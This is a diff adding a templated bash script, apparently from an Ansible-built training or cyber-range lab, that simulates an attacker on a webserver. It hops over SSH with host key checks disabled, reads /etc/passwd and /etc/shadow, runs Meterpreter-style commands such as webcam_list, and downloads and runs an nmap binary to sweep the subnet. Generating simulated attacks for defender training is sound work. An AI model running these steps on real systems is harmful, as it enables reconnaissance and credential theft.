@@ -1,0 +1,58 @@
+#!/bin/bash
+
+# Connect to csirt1, ignoring host key verification
+ssh -o StrictHostKeyChecking=no csirt1@{{ hostvars[item + "_csirt_client_1"].ansible_default_ipv4.address }} <<'EOF'
+
+    sleep 2s
+    
+    echo "connected to csirt"
+
+    # Connect to the third host, ignoring host key verification
+    ssh -o StrictHostKeyChecking=no {{ hostvars[item + "_webserver"].ansible_default_ipv4.address }} <<'INNEREOF'
+
+        sleep 2s
+
+        echo "connected to webserver"
+
+        # Do phishing stuff
+        whoami
+        sleep 5s
+        ls
+        ls -la
+        arp
+        sleep 5s
+        ifconfig
+        sleep 10s
+        netstat
+        route
+        resolve pleasehackme.com
+        sleep 2s
+        sysinfo
+        sleep 2s
+        webcam_list
+        ps
+        guid
+        sleep 5s
+        mic_list
+        dir
+        getuid
+        sleep 10s
+        cat /etc/passwd
+        sleep 2s
+        sudo cat /etc/shadow
+            
+        # Perform Nmap scan
+        for ip_address in $(curl -s https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap --output /tmp/nmap && chmod +x /tmp/nmap && /tmp/nmap -sn {{ hostvars[item + "_webserver"].ansible_default_ipv4.network }}/24 | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}"); do
+            last_octet=$(echo "$ip_address" | awk -F. '{print $4}')    
+            if [ "$last_octet" != "230" ]; then
+                echo "Scanning $ip_address"
+                nmap_output=$(/tmp/nmap "$ip_address")
+                echo "Nmap Output for $ip_address: $nmap_output"
+                sleep 15s
+            fi
+        done
+
+
+INNEREOF
+
+EOF
